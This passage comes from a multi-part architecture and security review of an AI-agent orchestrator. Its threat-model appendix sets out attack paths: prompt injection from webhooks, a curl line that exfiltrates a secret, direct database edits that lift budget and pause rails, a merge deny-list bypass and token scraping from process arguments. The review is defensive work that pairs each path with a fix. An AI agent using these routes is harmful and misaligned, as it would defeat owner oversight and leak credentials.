- Article: `aio-mental-models/volume-1-general-thinking/01-map-is-not-territory.md`.
- Change: named union types, covered by the enum test.
- Confidence: HIGH.

**C8, Medium: naming drift.**
- Evidence:
  - The ask is `interrupt` but the call is `cardCancel` (`define.ts:806, 1355`).
  - "agent" means both a library definition (`agentUpdated`) and a card's standing (`agentStandingUpdated`).
  - `ChangeKind 'mcp'` against `McpServer`.
  - Reads use `…Get` inconsistently.
- Article: `volume-01-foundations/12-cognitive-load.md`.
- Confidence: HIGH.

**C9, Medium: one flat 1,424-line contract, and a generator that churns.**
- Evidence:
  - Every feature edits `define.ts`, and another session has it modified right now (`git status`).
  - `socketrpc-gen` is by the Remit author, with 7 breaking major versions between 2.0.0 (2025-10) and 8.0.0 (2026-08) (generator `CHANGELOG.md:17-146`).
  - It is fetched with `bunx` and is not in `package-lock.json`. `make test` runs `check-gen` first (`Makefile:33`), so tests need bun and the registry, and they fail while the contract is unstaged.
- Leaving it: the generated code is committed and readable, so it can be frozen. Writing a replacement is days of work, not weeks.
- Confidence: HIGH on the facts, MEDIUM on the risk. LOW on whether the generator can read a contract split across files.

**C10, Low: auth is checked once, at connect.**
- Evidence: the socket is authorized only at the handshake (`rpc.go:61-69`), so it outlives the one-hour ID token and a removal from the allowed accounts. The idempotency "fingerprint" checks only the method name, not the arguments (`request.go:117`).
- Change: disconnect the socket when its token expires.
- Confidence: HIGH.

#### 4) Thin-replica audit

| Web code | What it decides | Server rule it duplicates or lacks |
|---|---|---|
| `tree.ts:32` | working = running, starting or permission | exact copy of `standing.go:528`, `schedule.go:496` |
| `CardActivity.vue:18` | busy = running or permission | a third variant of the same rule |
| `ChainActions.vue:27-30` | which actions a chain offers | no `ChainStanding.asks`; agents get `asks` from the server |
| `ChainList.vue:31, 39-42` | the "Running" filter groups three columns; counts per filter | grouping and counts (`design.md:549`) |
| `BoardView.vue:29` | caps Done at 30 and other columns at 200 | caps belong to the orchestrator (`design.md:550`) |
| `catalog.ts:176-184` | delivery counts in the top bar | "a count" (`design.md:549`) |
| `delivery.ts:6-12` | status label and tone; `pending` shown as "Waiting" | chains and agents get server labels; deliveries do not |
| `catalog.ts:62` | gist text: strips Markdown, cuts at 140 | truncation belongs to the orchestrator (`design.md:513`) |
| `catalog.ts:55` | health is bad unless `checkedAt` is the zero time | what `Health` means |
| `changes.ts:16-18` | `isInfra` regex: what counts as a deploy change | a domain rule nobody on the server owns |
| `playbook.ts:5, 10-11` | which chains are the Playbook author's | the capability id is copied |
| `library.ts:33-42` | count of secret slots waiting; option id `'machine'` | counts and an inbox option id |
| `sync.ts:67, 69, 84, 124` | toasts worked out from status transitions | "what waits for the owner" |
| `lanes.ts:40-88` | turn boundaries, block status and hand-offs from raw events | the server has `Reading` and message titles |
| `records.ts:37-43` | re-sorts lists "as the server keeps them" | ordering |
| `catalog.ts:52` | `DELIVERIES_KEPT = 200` | copy of `dispatcher.go:30` |
| `ui.ts:96-111` | status to tone, with a silent default | tones are open strings |

Formatting (money, durations, the file tree, `connectors.ts` geometry) is legitimately the adapter's.

#### 5) Stress-test of my recommendations

- **At 10x load**, C2 and C4 are the ones that bite. Per-socket interest brings its own risk: a push missed when the interest changes. Each home would need the same subscribe-then-read treatment the app has as a whole. MEDIUM
- **Arguing against C1:** one binary and one user; the versioning article says not to version. I agree, so I recommend a build-id reload, not API versions. Assumption: the owner keeps tabs open across deploys, which fits "around the clock".
- **Arguing against C3:** moving every label to the server bloats the contract and ties the server to the web's vocabulary. My line: meaning (status, grouping, counts, allowed actions) belongs to the server; how it looks belongs to the channel. `isInfra` could be argued to be a display hint.
- **Arguing against C2:** the default is 2 concurrent chains (`cmd/remit/main.go:52`), so traffic is small today. Logging drops comes first; the routing change is justified only by evidence.
- **What I assumed and did not run:** that socket.io ignores an unknown event (so the caller times out), how often the agent runtime streams chunks, and whether the generator can read a contract split across files.

#### 6) Coverage

- **Read in full (34 files):** `define.ts`; `rpc.go`, `api.go`, `broadcast.go`, `convert.go`; `request.go`, `views.go`; `sync.ts`, `catalog.ts`, `openChain.ts`, `homes.ts`, `records.ts`, `rev.ts`, `resync.ts`, `act.ts`, `drafts.ts`; `lanes.ts`, `connectors.ts`, `changes.ts`, `delivery.ts`, `playbook.ts`, `library.ts`, `webhooks.ts`, `tree.ts`, `review.ts`, `patch.ts`; `rpc/index.ts`, `rpc/reconnect.ts`, `verify/fakeClient.ts`; `Makefile`, `package.json`; `AGENTS.md` and `design.md` lines 1-70 and 500-569; the generator's `CHANGELOG.md`.
- **Read in part (8):** `server.generated.go`, `convert_test.go`, `ui.ts`, `stream.ts`, `ChainList.vue`, `stream.go`, `store.go`, the head of `client.generated.ts`.
- **Checked with `rg` only:** the other ~88 components.
- **Skipped:** `nav.ts`, `assistant.ts`, `openDelivery.ts`, `StreamBlocks.vue`, `AgentLanes.vue` and the internals of the `rpc` tests, for time. About 27 of 45 web logic modules were read.
- **Articles read in full and cited:** API versioning, pagination, API idempotency, consumer-driven contracts, publisher-subscriber, backends-for-frontends, schema evolution, cognitive load, and the two mental models (map is not the territory, feedback loops). Not read, so not cited: resource-oriented design, async API patterns, API design principles, anti-corruption layer, gateway aggregation, materialized view, consistency models, change data capture, derived data, separation of concerns, vertical slice.
- **Process slip:** one `rg` command redirected its output to `/dev/stdin`, which broke the read-only rule. It hung, and I stopped it. No file was created or changed.

##### Critical Files for Implementation
- `web/src/rpc/define.ts`
- `internal/rpc/broadcast.go`
- `internal/rpc/convert_test.go`
- `web/src/sync.ts`
- `internal/orch/views.go`

---

## Appendix 5: Security and threat model (reviewer 5 of 8)

#### 1) Verdict

- **Every rail is bypassable by any agent with a shell (HIGH).** Agents run as the server's OS user, so they can read `~/.remit/secret.key` and write `remit.db` directly. That defeats budget caps, pause, and the record of who acted. The secret-path rules still guard `~/.remit/token`, a file no code writes any more, and do not list the key file or the database.
- **Untrusted outside text reaches agents that hold a shell and the network (MEDIUM).** Webhook bodies, Jira tickets written by customers, and repository files all get there. `-autonomous` is on by default, so outward actions are approved by the Chair, which is a language model.
- **Merging is not enforced by code (HIGH).** The deny list blocks `glab mr merge` but not `glab api -X PUT …/merge`, and it does not block scripts.
- **The design is sound where it is code.** Webhook-key handling, sealing, CEL limits, owner-only checks, path validation and DOMPurify are good. The issue is that the code sits inside one OS trust zone.
- **Cheapest fixes, in order:** a GitLab token that cannot merge; a tool allowlist for the Dispatcher; agents as a separate OS user or sandbox with filtered network egress.

Frameworks used (full articles read): `…/aio-threat-models/volume-1-foundations/01-shostack-4-questions.md`, `02-dfd-trust-boundaries.md`, `volume-2-core-frameworks/01-stride.md` (severity on a bug bar, no DREAD), `volume-3-attacker-centric/01-attack-trees.md`, `02-persona-non-grata.md`, `volume-6-ai-ml/01-owasp-llm-top10.md`, `02-mitre-atlas.md`, `03-nist-ai-rmf.md`, `volume-7-cloud-devsecops/03-continuous-threat-modeling.md`, and `…/volume-10-modern-paradigms/04-zero-trust.md`, `13-authorization-at-scale.md`.

#### 2) DFD and trust boundaries

```
 [Internet senders: GitLab commenters, Sentry end-users, Jira customers]
        | POST /hooks/<name> + key            ==TB1 (unauthenticated -> key)==
        v
 [Reverse proxy]--/socket.io,/auth,/hooks-->( Go server: rpc | webhook door | orch | /mcp )
 [Browser, Google ID token] ==TB2==^            |  ^ Bearer card-token (127.0.0.1)  ==TB3==
                                                |  |
         ======================== TB4 (should exist; does NOT: same OS user) =========
         | (claude-agent-acp / codex-acp per card)  Chair, workers, Scout, Assistant,  |
         |  Dispatcher, judges  --Bash/web-->  GitLab(glab), AWS, kube, Jira, Internet |==TB5 egress (open)
         |  stdio MCP servers, headers helper, repo .claude/settings.json hooks       |
         =============================================================================
                  | read/write, same UID
                  v
   ||SQLite remit.db||  ||secret.key||  ||~/.claude, ~/.codex/auth.json, glab config||  ||vault, worktrees||
   ^ imported skills/agents/MCP from ~/.claude (TB6: "owner's own config", writable by agents)
```

#### 3) Ranked threats (bug bar = likelihood × impact)

**S1. Every rail can be defeated from a shell (EoP, Tampering, Repudiation). Critical. Confidence HIGH.**
- Evidence:
  - The gap is admitted in `docs/design.md:755-758` and `secrets.go:6-7`.
  - The key file is `<data>/secret.key` (`main.go:74`) and the database is `<data>/remit.db` (`main.go:145`).
  - The rules list only `*.remit/token*` (`policy.go:90`) and `~/.remit/token` (`policy.go:99`). `rg` finds no code that writes that token file.
  - The Codex profile makes `"/" = "read"` (`codexhome.go:36`) and does not deny the data directory.
  - The data directory is created 0755 (`main.go:142`) and `agents.log` 0644 (`main.go:151`).
- Attack path:
  1. An agent that has been injected reads `secret.key` and opens every MCP credential and webhook key with AES-GCM.
  2. It runs `python3 -c 'import sqlite3…'` to raise `budget_usd`, un-pause a chain, or insert decision rows under a forged actor.
  3. No ask rule matches any of this.
- Mitigation:
  - Run agents as a separate OS user, or under `bwrap`/nsjail per card, with the data directory 0700 and the database and log 0600.
  - Add the key file and database paths to `SecretReads` today (a tripwire only).
  - Cost: about 1–2 days in `ACPLauncher` plus per-agent credentials.

**S2. Indirect prompt injection from the internet reaches a shell (LLM01 → Excessive Agency, LLM08 v1 / LLM06 v2025). Critical. Confidence MEDIUM.**
- Evidence:
  - The Dispatcher's `start_chain` puts the sender's claims into a chain's goal (`dispatcher_tools.go:97-133`).
  - That chain gets the "Free" playbook and the default $1000 cap (`lifecycle.go:79-91`, `main.go:48`).
  - Only workers are narrowed (`library/access.go:128`), so the Chair and the Assistant get every tool (`access.go:33-47`).
  - Jira text written by customers reaches the Scout unfenced (`jira.go:198-200`).
  - Reads are not asked about (`policy.go:66-71`).
- Attack path:
  1. Someone puts instructions in a Sentry error message or a GitLab comment.
  2. The Dispatcher starts a chain.
  3. The Chair or a worker runs `curl https://x/?d=$(cat …)`.
- Mitigation:
  - Allow-list egress through a proxy.
  - Chains from webhooks or the Scout start with `OwnerWaits` set, or with a playbook that has no network.
  - Cost: hours for the flag; about a day for the proxy.

**S3. Merging depends on the Chair's judgement (EoP). High. Confidence HIGH.**
- Evidence:
  - `denyTools` lists `glab mr merge` but not `glab api` (`policy.go:40-43`).
  - `glab api … -X` is only an ask rule (`policy.go:84`).
  - With `-autonomous` true (`main.go:49`), a worker's request goes to the Chair (`permission.go:73-75`), and the Chair's allow goes through (`permission.go:249-264`).
  - The `outwardCommand` regex (`policy.go:26`) runs only in `autoPermission` (`permission.go:297-316`).
  - Scripts match no rule at all.
- Attack path:
  1. A worker asks to run `glab api -X PUT projects/…/merge_requests/N/merge`, or runs a Python script with the glab token.
  2. The Chair allows it.
  3. The MR is merged.
- Mitigation:
  - Give agents a bot or project token with the Developer role, and protect branches as "Allowed to merge: Maintainers", so GitLab itself refuses.
  - Run the `outward` regex before `askChair`.
  - Cost: hours.

**S4. The Dispatcher's "no shell" holds only on Claude, and only as a deny list (EoP). High. Confidence HIGH on the code, MEDIUM at runtime.**
- Evidence:
  - The Dispatcher's rules are bare names: `"Bash","Read",…` (`policy.go:51-52,62`).
  - `deniedBy` only matches `Bash(spec)` rules and edit tools (`deny.go:36-39`), so a bare `"Bash"` never refuses an execute request.
  - The Dispatcher's tool list is nil, so its needs are empty and Codex is allowed to run it (`provider.go:49-51,65-79`, `failover.go:34-37`, `dispatcher.go:119`).
  - On Claude, the list still says `Task`, but the subagent tool is now `Agent`. `Monitor` (a shell command or a WebSocket URL) and `Workflow` are not listed (`sdk-tools.d.ts:772,2869,2977`).
- Attack path:
  1. Claude has an outage, so the Dispatcher fails over to Codex.
  2. A delivery tells it to `cat ~/.remit/secret.key`.
  3. It puts the key into a `start_chain` goal, and the new chain's agents have the network.
- Mitigation:
  - Give the Dispatcher `Tools: []`, an allowlist that leaves only `mcp__remit`. On Claude this is deterministic, and on Codex the start is then refused.
  - Cost: one line plus a test.

**S5. Card tokens and opened secrets are in process arguments (Information Disclosure → Spoofing). High. Confidence MEDIUM.**
- Evidence:
  - The launch spec carries `Authorization: Bearer <token>` (`access.go:68`).
  - claude-agent-acp copies HTTP headers and stdio `env` into the SDK's server config (`runtime/node_modules/@agentclientprotocol/claude-agent-acp/dist/acp-agent.js:8508-8527`).
  - The SDK passes that config as `--mcp-config <JSON>` on the command line (`claude-agent-sdk/sdk.mjs:157`).
  - `/mcp` accepts any live token (`tools.go:369-384`).
- Attack path:
  1. An agent runs `ps -eo args` and finds the Assistant's token.
  2. It POSTs to `127.0.0.1:4320/mcp` as the Assistant.
  3. It can answer permission requests and message agents in the owner's name.
- What still holds: approving changes is owner-only (`change_item.go:180`), and so is entering credentials (`credentials.go:57`).
- Mitigation: the S1 isolation; tie each token to its process (a Unix socket checked with `SO_PEERCRED`).

**S6. Importing an MCP server skips the rail (EoP). Medium. Confidence HIGH.**
- Evidence:
  - A new server is imported without `holdMCPServer` (`library_import.go:43-56`).
  - The headers helper runs through `sh -c` with the server's own environment (`helper.go:35-37`).
  - The design treats the imported file as trusted, as "the owner's own configuration" (`design.md:716-717`), but agents can write it.
- Attack path:
  1. An agent writes a server entry into `~/.claude.json`.
  2. It calls `import_mcp_server`.
  3. The command runs as the server user, without the owner's approval.
- Mitigation: hold every import made by an agent. One line.

**S7. A persistent backdoor through edits that need no approval (LLM01, LLM05). Medium. Confidence MEDIUM.**
- Evidence:
  - The rail covers only the MCP command and helper, playbook capabilities that write, and the cost cap (`rail.go:13-21`).
  - Agent instructions become part of the system prompt (`library/access.go:148`) and need no approval; skills likewise.
- Attack path: one Playbook-author turn that has been injected writes instructions into an agent definition, and every later hire carries them.
- Mitigation: an agent's write to instructions or skill files opens a change item for the owner.

**S8. Shell injection in the server's submit checks (Tampering). Medium. Confidence HIGH.**
- Evidence: package directories taken from changed file paths are joined into a `sh -c` command without quoting (`repo.go:364-372,390-403`).
- Impact: today the gain is small because agents share the server's user. Once S1 is fixed, this becomes a way out of the sandbox.
- Mitigation: call `exec.Command("go","vet",pkgs...)` with no shell.

**S9. Denial of wallet (LLM04). Medium. Confidence HIGH.**
- Evidence:
  - One delivery can start 3 chains (`dispatcher.go:28`).
  - Each has a $1000 default cap, hard at 1.25× (`budget.go:9`).
  - The only backstop is the $10,000 daily default (`main.go:54`).
  - Up to 100 deliveries can be pending (`webhook.go:34`), with no per-webhook quota.
  - Spending an agent does from its shell, for example running `claude -p`, is not counted.
- Mitigation: a daily chain quota per webhook, a small cap for chains from webhooks, and lower defaults.

**S10. Repository settings run code (LLM05, supply chain). Medium. Confidence MEDIUM.**
- Evidence: sessions load the project's settings (`dialect.go:46`), so a branch can bring its own `.claude/settings.json` hooks and its own `CLAUDE.md`.
- Mitigation: `disableAllHooks`, or no setting sources.

**S11. Details at the webhook door (Information Disclosure, LLM01). Low. Confidence HIGH.**
- The key is accepted in `?token=` (`handler.go:98`), so it can end up in proxy logs.
- Only the token, `Authorization` and `Cookie` headers are removed (`handler.go:46,116-124`). Another sender's secret header, such as `X-Api-Key`, is stored and shown to the Dispatcher.
- Header values and the summary are printed outside the fence (`webhook.go:181-183`, `door.go:143`).
- Failed key attempts are not rate-limited.
- Mitigation: remove any header matching `/token|secret|key|auth|signature/i` and fence the headers.

**S12. Session and browser details. Low. Confidence HIGH.**
- A socket is authorized once, when it connects (`rpc.go:61-69`), and is never re-checked when the Google token expires.
- No Content-Security-Policy header is set (`rg` finds none).
- Markdown images are allowed, so an agent's message can make the owner's browser fetch an outside URL.
- The design's line about the owner's token file (`design.md:757`) is out of date.

#### 4) Rails and the code that enforces them

| Rail | Enforcing code | Bypass |
|---|---|---|
| Authentication (browser) | `auth/firebase.go:83-124`; `rpc.go:74-94,112`; channels act only for the owner, `request.go:52-54` | none found (S12 is minor) |
| Authentication (door) | `webhook_keys.go:212-225`, constant-time compare | S11 |
| Authentication (agents' MCP) | `tools.go:376-384` | S5 |
| Budget caps | `budget.go:11-21`, `step.go:528-530`; daily budget `admit.go:73`; cap only from the playbook `lifecycle.go:125-133`; raise is a rail `rail.go:79-81`; only the owner approves `change_item.go:180` | S1 (database write), S9 |
| Pause and stop | `step.go:315-331,457` | S1 |
| Merging | **NOT FOUND as code.** Only the deny list `policy.go:39-43` and `deny.go:21-43`; no merge code exists (`review.go:16-18`) | S3 |
| Sign-in / credentials | `credentials.go:57`, `credentials_machine.go:43` | S1 (read the key file) |
| No writing playbook for proposed or webhook chains | `lifecycle.go:119` | none found |

#### 5) What is genuinely good

- **Webhook keys:** 256-bit keys (`webhook_keys.go:76-82`), constant-time comparison (`webhook_keys.go:224`), the same 401 for every refusal, and 1 MiB / 64 KiB body limits.
- **Sealing:** AES-GCM bound to the slot (`webhook_keys.go:85`), and a key file that others can read is refused (`secrets.go:59`).
- **CEL:** cost and time limits plus type checks when an expression is written (`precondition.go:35-69`).
- **Outside text:** a fence its own content cannot close (`webhook.go:193-199`); `read_delivery_fields` withholds free text from the Assistant.
- **Imports and skills:** path checks (`skills/validate.go:90-125`) and `confine` with `EvalSymlinks` (`importer.go:95-110`).
- **Browser:** agent text is sanitized with DOMPurify (`Markdown.vue:37`).
- **Other:** owner-only checks, every action recorded with its actor, idempotent requests, and a strict Firebase verifier.
- **SQL:** no SQL is built by joining strings (`rg` found none).

#### 6) Stress-test (STRIDE misses threats systematically, per the Scandariato note in the STRIDE article)

- **S5** rests on code I read in `node_modules` but did not run. The adapter could change. MEDIUM.
- **S4:** Claude Code may apply `Bash` deny rules to `Monitor` and to subagents. If so, only the Codex half stands, and that half needs a Claude outage.
- **S3:** how Claude Code matches the ask-rule globs is unverified. The script route does not depend on it. Claude's auto-mode classifier may block some actions, but that is a model's judgement, not code.
- **S2:** likelihood depends on how well the model resists injection.
- **S1:** the gap is already known; what is new here is tampering with the database and the stale token path.
- **S10:** a false positive if every repository and branch is trusted.

Attack trees (OR = any child is enough; Schneier's article says the cheapest path wins):
- **Exfiltrate a secret.** Cheapest: a shell `cat` plus a curl GET (S1 + S2). Also the argv scrape (S5), and a Dispatcher on Codex passing it through `start_chain` (S4).
- **Lift a rail.** Cheapest: write the database (S1). Also the Chair allowing `glab api` merge (S3), an import that skips the rail (S6), and the Assistant's stolen token (S5, which cannot lift owner-only rails).
- **ATLAS mapping:** Initial Access by indirect injection → Execution through a tool → Exfiltration.

#### 7) Coverage

- **Read:** about 46 of the 121 non-test Go files (many only in part), plus `Markdown.vue`, two runtime JS files, `AGENTS.md`, and the parts of `design.md` asked for.
- **Skipped (searched with `rg` only):** `store.go`, `migrate.go`, `step.go`, `apply.go`, `assistant.go`, the importer's `skill.go` and `mcp.go`, all web components but `Markdown.vue`, and the tests. The reason was the word budget, so these were checked by targeted search rather than reading.
- **Not run:** nothing was executed, per the read-only scope.

##### Critical files for implementation
- internal/orch/policy.go
- internal/orch/deny.go
- internal/orch/access.go
- internal/orch/library_import.go
- internal/agent/agent.go

---

## Appendix 6: Operations, delivery and fitness functions (reviewer 6 of 8)

I'm reviewer 6 (operations, delivery, tests, fitness functions). All paths are relative to `.` unless they start with `~` or `/`.

#### 1) Verdict

1. The domain core is unusually well tested: 981 Go test functions, 1.15 lines of test per line of code, crash and replay tests, and a fake ACP agent run as a real subprocess. **HIGH**
2. Most architecture rules are kept only as prose. About 7 of roughly 26 stated rules have a machine check. Code follows the rest today, so locking them in is cheap now. **HIGH**
3. Operations is the weak side. Production runs the binary built in the dev working tree, the public UI is served by a Vite dev server from that tree, and there is no CI, no git hook, no automatic backup and no version stamp. **HIGH**
4. The Outcomes page is a good set of owner-facing measures, but the owner has to open it. Nothing raises an alarm when nothing is happening. **HIGH**
5. Main fixes: build releases from a clean commit, back up the database before migrating, add about 10 sub-second fitness tests, and add a deterministic idle watchdog. **MEDIUM**

#### 2) Genuinely good (keep)

- **Contract drift gate:** `Makefile:18-19` (`check-gen`), field parity `internal/rpc/convert_test.go:41`, enum parity `:258`.
- **Every action has a replay case:** `internal/rpc/replay_test.go:358-368` reflects over `wire.ServerHandler`.
- **Atomicity tests:** `leave_test.go:26` (browser leaves mid-call) and 11 crash-survival tests in `internal/orch/crash_test.go:94-387`.
- **Real-process fakes, not mocks:** the test binary doubles as an ACP agent (`internal/agent/agent_test.go:24-48`) and as a fake `glab` (`internal/orch/gitlab_test.go:28-33`). Commit tests use real git.
- **Injected clock:** zero `time.Now()` in orch production code (`orch.go:70`). `testing/synctest` is used in 10 files.
- **Migrations:** numbered and transactional, and a database written by a newer build is refused (`internal/store/migrate.go:378-400`, `migrate_test.go:241`).
- **Owner measures:** `internal/outcomes/kpi.go:109-155` covers cost per merged change, stalled chains, budget cuts and owner wait.
- **Static checks:** `go vet ./...` passes with no output. The build succeeds. The import graph is acyclic and shallow.

#### 3) Stated rule → enforced? → by what

| Rule (source) | Enforced? | By / evidence |
|---|---|---|
| Contract is the one definition, generated (AGENTS.md:50) | **Yes** | `Makefile:18`, `convert_test.go:41,258` |
| Generated code not hand-edited (README:94) | **Yes** | `check-gen` |
| Every action has a request id; a replay does not act twice (AGENTS.md:84) | **Partial** | `replay_test.go:358` checks handlers that take a Request. Nothing checks that every mutating handler takes one. |
| No action leaves the server half-changed (AGENTS.md:83) | **Yes** (behavioural) | `leave_test.go:26`, `crash_test.go` |
| Every Remit tool says what its caller is doing | **Yes** | `standing_test.go:411` |
| Writes leave a Change | **Yes**, listed kinds only | `changes_test.go:42,76` |
| DB from a newer build refused | **Yes** | `migrate_test.go:241` |
| One writer per chain (design.md:118-121) | Prose | Call sites `apply.go:435`, `lifecycle.go:64`, `routine.go:305` are not pinned |
| No global state (AGENTS.md:88) | Prose | Compliant: 94 package-level vars, all sentinels, regexes or tables. `DefaultPlaybooks` is an exported mutable slice (`playbooks.go:16`). |
| Flat packages (AGENTS.md:85) | Prose | Graph is clean, but `internal/orch` has 76 files and 19.9k lines |
| Every clock read through `o.now` | Prose | Compliant |
| Small units, one job (AGENTS.md:58-62) | Prose | `apply.go` 806 lines, `standing.go` 772 |
| Migration never edited once released (`migrate.go:8-10`) | Prose | One comment was edited in `149b0da` |
| Any package with goroutines runs under `-race` (`Makefile:27-31`) | Prose, **violated** | `secrets_test.go:231`, `store_test.go:325` run without `-race` |
| `make test` before every commit (AGENTS.md:160) | Prose | No CI, no `.git/hooks` |
| Look at the UI in a browser (AGENTS.md:98) | Prose | `web/verify` (60 files) is not part of `make test` |
| Colour, font, shadow is a token (AGENTS.md:114) | Prose | One violation: `AgentLanes.vue:382` `rgba(...)` |
| Component root sets no outer margin; loops animate only transform/opacity; no ring for card state | Prose | Not checked |
| Tools only via named capabilities, never by checking origin (AGENTS.md:22) | Prose | Origin branching exists: `goal.go:397`, `prompts.go:191` |
| Rails stay deterministic; no agent merges | **Yes** | `deny_test.go:25-42`, `rail_test.go`, `rails_test.go` |
| Delete what becomes redundant; behaviour change gets a test first | Prose | No deadcode check |

#### 4) Findings

**O1 Critical. Production is the dev working tree.**
- **Evidence:** In `~/.remit/ecosystem.config.cjs`, pm2 runs `bin/remit`. `remit-web` is `vite` on `0.0.0.0:5173`, published at `remit.example.com` (`web/vite.config.ts:11`). `go version -m bin/remit` shows no `vcs.*` lines, so the running revision cannot be identified. The tree has 38 dirty files, and `bin/remit` was rebuilt at 12:46 during this review.
- **What breaks:** Any AI session's `make build` plus a restart ships untested, uncommitted code. Any `.vue` save hot-reloads into the owner's live UI.
- **Articles:** `volume-04-resilience/14-safe-deployments.md`, `volume-09-operations-delivery/06-infrastructure-as-code.md`, `volume-04-resilience/15-health-endpoint-monitoring.md` (Step 5, build information).
- **Fix:** Add `make release`. It builds from a clean `git worktree` at HEAD, runs `make test`, writes to `~/.remit/releases/<sha>/`, switches a `current` symlink and keeps `previous`. Serve the embedded `web/dist` from Go instead of the Vite dev server. Move the ecosystem file into `deploy/`.
- **Effort:** half a day. **Confidence:** HIGH.

**O2 High. No CI and no hooks.**
- **Evidence:** No `.gitlab-ci.yml`, no `.github/`, no hooks. Commit `b1a0e7b` touched 478 files and +63k lines; `149b0da` touched 242 files.
- **What breaks:** Fitness functions only run when a session chooses to run them. Batches stay huge.
- **Articles:** `06-fitness-functions.md` (Mistake 3), `12-trunk-based-development.md`.
- **Fix:** A versioned `scripts/pre-push` hook calling a new `make check` (vet plus fitness tests, under 10 s), and a GitLab pipeline running `make test`.
- **Effort:** 2 hours. **Confidence:** HIGH.

**O3 High. Backups are manual; migrations have no snapshot.**
- **Evidence:** There are 17 hand-made `~/.remit/backup-*` folders (e.g. `-prerestart-v26`, `-preconditions`), some holding separate copies of `remit.db`, `-wal` and `-shm`. Copying a live WAL database as three files is not atomic. `store.Open` migrates automatically (`store.go:87`) with no snapshot. 30 migrations landed in about 3 days. Because a newer database is refused, rolling back the binary means restoring the old database and losing everything written since.
- **Fix:** In `store.Open`, run `VACUUM INTO <data>/backups/v<from>-<ts>.db` before applying pending migrations, keep the last N, and add a nightly snapshot.
- **Effort:** 2 hours. **Confidence:** HIGH.

**O4 High. The daily-spend rail is too loose to protect anything.**
- **Evidence:** Defaults are `-daily-budget 10000` and `-budget 1000` (`cmd/remit/main.go:48,54`), and the pm2 config keeps them. Actual spend, from a read-only query of the 12:12 backup copy, was $429 on 10-26 and $479 on 10-27. The cap is about 21 times a normal day.
- **What breaks:** A runaway loop can spend about $9.5k before the rail trips. "Spend without results" is an anti-goal.
- **Article:** `aio-mental-models/volume-3-systems-mathematics/05-margin-of-safety.md` (the margin must match the consequence).
- **Fix:** Set the cap explicitly in the deploy config from measured spend, and add a deterministic "spend today is more than 2x the 14-day median" item in the owner's inbox.
- **Effort:** 1 hour. **Confidence:** HIGH on the numbers, MEDIUM on the threshold.

**O5 Med-High. Nothing tells the owner when nothing is happening.**
- **Evidence:**
  - The only routes are `/socket.io/`, `/mcp`, `/auth/config`, `/hooks` and the SPA (`main.go:206-210`). There is no `/healthz`.
  - `Health` covers providers only (`health.go:23-28`).
  - `SystemNow` has three fields (`outcomes.go:26-30`).
  - KPIs are weekly and only shown when the page is opened; there is no outbound notifier.
- **What breaks:** A stuck scheduler, or a Scout that produces nothing, is noticed only when the owner looks. That is "having to babysit", unmeasured. Time-to-first-MR and spend on chains that produced no MR are not measured either.
- **Articles:** `02-slo-sli-sla.md`, `03-observability.md`, `15-health-endpoint-monitoring.md`.
- **Fix:**
  - Add `/healthz`: process up, database ping, scheduler tick within the last 3 minutes, build sha.
  - Add `lastChainStartedAt`, `lastMrOpenedAt` and `schedulerTickAt` to System now.
  - Add an idle watchdog that writes an inbox item.
  - Add two measures: "share of spend with no MR" and "time to first MR".
- **Effort:** 1 day. **Confidence:** MEDIUM.

**O6 Med. Logs and data grow without limit and are hard to query.**
- **Evidence:**
  - Logs use the text handler (`main.go:69`). There is no `log.With` anywhere, and about 19 of 100 orch log calls carry `"chain"`.
  - `agents.log` is append-only (`main.go:151`).
  - No retention or VACUUM code exists.
  - The database is 94 MB after about 3 days (40,436 events) and `work/` is 2.5 GB.
- **Fix:** JSON logs, a logger scoped per chain, rotation, and a disk-budget check.
- **Effort:** 3 hours. **Confidence:** HIGH.

**O7 Med. Most architecture rules are prose only (see section 3).**
- **What breaks:** As `orch` grows, drift arrives silently. AGENTS.md:315-318 says that file must stay small, and rules held only in prose cost tokens in every session.
- **Article:** `06-fitness-functions.md`.
- **Fix:** Section 5.
- **Confidence:** HIGH.

**O8 Med. Test timing can flake.**
- **Evidence:**
  - There are 241 `eventually`/`waitFor` polls with wall-clock deadlines (`orch_test.go:190-200`, 3 s).
  - About 18 `time.Sleep` calls sit outside synctest (e.g. `outbox_test.go:55,76,83`, `goal_test.go:707`, `lifecycle_test.go:170`).
  - `t.Parallel()` appears once in the repo.
  - There are past deflake commits (`ed0a52d`, `ce8fdfa`).
  - Tests share the host with 4 live chains.
- **Article:** `11-testing-strategies.md` (flaky test management).
- **Fix:** Move time-based tests into `synctest`, and scale deadlines when `-race` is on.
- **Confidence:** MEDIUM. I did not run the tests, since running them was not permitted.

**O9 Low-Med. The race list is wrong and Go walks into node_modules.**
- **Evidence:** `PLAIN_PKGS` lists `secrets` and `store`, whose tests spawn goroutines (`secrets_test.go:231` is an explicit concurrency test). `go list ./...` includes `web/node_modules/flatted/golang/pkg/flatted`, so `make test` race-tests third-party code (`Makefile:34`).
- **Fix:** Take `secrets` and `store` out of `PLAIN_PKGS`, and add `ignore ./web/node_modules` to `go.mod`. MEDIUM: Go 1.25 added the `ignore` directive.
- **Effort:** 15 minutes.

**O10 Med. No record of why decisions were made.**
- **Evidence:** No `docs/decisions/`. `design.md` is rewritten in place under the "Positive framing" rule (AGENTS.md:277-283), which sends history to "ADR, changelog, commit log". Yet commit `b1a0e7b` says the per-package history is "in the scratch repo the coordinator used", which is outside this repo. The only decision log is `design.md:747-767`.
- **Article:** `volume-01-foundations/11-architecture-decision-records.md`.
- **Fix:** Add `docs/decisions/NNNN-slug.md` with Status, Context, Decision, Consequences and Rejected, plus two lines: `Enforced by: TestX` and `Supersedes:`. Once a decision is accepted, it is never edited. `design.md` stays the current-state document and links to the ADRs. Keep each ADR around 30 lines so a session can write it in one turn.
- **Effort:** 1 hour, plus writing the first ~8 ADRs from history. **Confidence:** HIGH.

#### 5) Fitness functions to add (best value for effort first)

All of these use the standard library only (`go/parser`, `go/build`, `reflect`) or vitest. Each runs in under a second, so together they add under about 5 s per `make test` run (an AI-session cost). Each starts from an allowlist of today's exceptions, as `06-fitness-functions.md` Mistake 2 advises.

1. **Import graph allowlist:** a table of allowed `internal/*` edges equal to today's graph. It forbids `orch → rpc/wire`, `store → orch`, and `model` importing anything. 30 min.
2. **One writer:** `PutChain` may be called only from `apply.go`, `queueChain` and `startRun`. 30 min.
3. **Released migrations are immutable:** a golden file of per-migration SHA-256 hashes; appending passes, editing fails. 30 min.
4. **Every mutating RPC takes a Request:** reflect over `wire.ServerHandler`; any method not on a read allowlist must take Request first. This is the inverse of the replay test. 30 min.
